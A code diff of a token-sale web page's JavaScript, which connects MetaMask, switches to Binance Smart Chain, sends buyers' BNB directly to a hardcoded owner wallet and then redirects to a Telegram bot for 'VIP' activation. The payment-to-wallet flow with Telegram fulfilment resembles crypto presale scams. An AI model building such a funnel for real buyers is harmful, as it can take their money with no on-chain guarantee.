@@ -1,10 +1,9 @@
-const OWNER_WALLET = "0xc98415672A80a26bEC29427b7284D65B73c5Ff7B"; // IDE RAKD AZ ÚJ BIZTONSÁGOS TÁRCÁD CÍMÉT!
+const OWNER_WALLET = "0xc98415672A80a26bEC29427b7284D65B73c5Ff7B"; 
 const RATE = 1000000; 
 
 let web3;
 let userAccount;
 
-// Console log helper
 function log(msg) {
     const el = document.getElementById('console-log');
     const time = new Date().toLocaleTimeString();
@@ -19,7 +18,6 @@ window.addEventListener('load', async () => {
         document.getElementById('connect-btn').addEventListener('click', connectWallet);
         document.getElementById('buy-btn').addEventListener('click', buyTokens);
         
-        // Dynamic Calculator
         document.getElementById('bnb-amount').addEventListener('input', (e) => {
             const val = parseFloat(e.target.value);
             if(val > 0) {
@@ -39,14 +37,13 @@ async function connectWallet() {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAccount = accounts[0];
         
-        // UI Update
         const btn = document.getElementById("connect-btn");
-        btn.innerHTML = `<span style="color:#0aff00">●</span> ${userAccount.substring(0,6)}...${userAccount.substring(38)}`;
+        btn.innerHTML = `<span style="color:#0aff00">●</span> ${userAccount.substring(0,6)}...`;
         btn.style.borderColor = "#0aff00";
+        btn.style.color = "#0aff00";
         
         log(`Wallet Connected: ${userAccount}`);
         
-        // Check Network (Switch to BSC)
         const chainId = await web3.eth.getChainId();
         if (chainId !== 56) {
             switchToBSC();
@@ -59,10 +56,10 @@ async function switchToBSC() {
     try {
         await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }], // 56 in hex
+            params: [{ chainId: '0x38' }],
         });
     } catch (error) {
-        log("Please switch to Binance Smart Chain manually.");
+        log("Please switch to Binance Smart Chain in MetaMask.");
     }
 }
 
@@ -75,7 +72,7 @@ async function buyTokens() {
     const amountWei = web3.utils.toWei(bnbAmt, 'ether');
     const amountHex = web3.utils.toHex(amountWei);
 
-    log(`Initiating Transaction: ${bnbAmt} BNB...`);
+    log(`Initiating Transfer: ${bnbAmt} BNB -> Core Wallet`);
 
     try {
         const txHash = await window.ethereum.request({
@@ -88,8 +85,8 @@ async function buyTokens() {
         });
 
         log(`✅ SUCCESS! Hash: ${txHash}`);
+        log(`⏳ Processing Voucher...`);
         
-        // Átirányítás a Telegram Botra a hash-el
         setTimeout(() => {
             if(confirm("Transaction Successful! Click OK to activate VIP Protocol.")) {
                 window.open(`https://t.me/SkyAI_PaymentBot?start=${txHash}`, "_blank");
